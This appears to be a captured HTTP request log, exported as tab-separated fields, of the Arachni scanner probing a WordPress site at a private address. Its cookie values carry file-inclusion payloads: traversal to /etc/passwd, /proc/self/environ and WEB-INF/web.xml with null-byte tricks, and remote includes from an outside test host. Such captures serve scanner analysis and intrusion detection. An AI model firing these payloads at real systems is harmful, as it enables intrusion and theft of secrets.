http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\WEB-INF\web.xml%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\WEB-INF\web.xml	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\WEB-INF\web.xml%00.	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\WEB-INF\web.xml	/web/index.php/wp-json/oembed/1.0/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/2022%5C/01%5C/21%5C/hola-mundo%5C/embed%5C/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3369						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=hTtP://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3370						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhTtP://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3564						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=hTtP://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3563						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhTtP://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3371						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=http://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3574						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhttp://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3373						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=http://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3584						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhttp://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3374						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3585						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checktests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3376						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3595						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checktests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3604						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/proc/self/environ%00.	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3622						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/proc/self/environ	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3615						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///proc/self/environ%00.	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3596						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///proc/self/environ	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3605						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/etc/passwd%00.	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3616						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/etc/passwd	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3378						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///etc/passwd%00.	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3380						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///etc/passwd	/web/index.php/2022/01/21/hola-mundo/embed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3663						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=hTtP://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3664						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhTtP://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3665						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=hTtP://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3666						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhTtP://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3667						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=http://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3668						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhttp://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3669						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=http://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3670						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhttp://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3385						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3386						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checktests.arachni-scanner.com/rfi.md5.txt	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3453						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3400						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checktests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3734						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/proc/self/environ%00.	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									3735						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/proc/self/environ	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
